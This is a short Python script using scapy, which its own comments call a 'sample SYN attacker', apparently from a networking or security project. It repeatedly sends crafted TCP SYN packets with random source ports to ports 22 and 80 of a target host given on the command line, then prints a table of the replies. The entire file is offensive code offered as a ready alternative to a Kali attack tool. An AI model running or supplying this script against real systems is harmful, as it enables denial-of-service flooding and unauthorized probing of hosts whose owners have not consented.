# This is a sample SYN attacker. I used the tool provided by Kali since that one was more
# powerful and less resource consuming. I just upload this one as an alternative in case you
# don't have access to Kali while running the project


from scapy.all import *

print("Field Values of packet sent")
p = IP(dst=sys.argv[1], id=1111, ttl=99) / TCP(sport=RandShort(), dport=[22, 80], seq=12345, ack=1000, window=1000, flags="S")/"HaX0r SVP"
ans, unans = srloop(p, inter=0.3, retry=2, timeout=4)
ans.make_table(lambda(s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
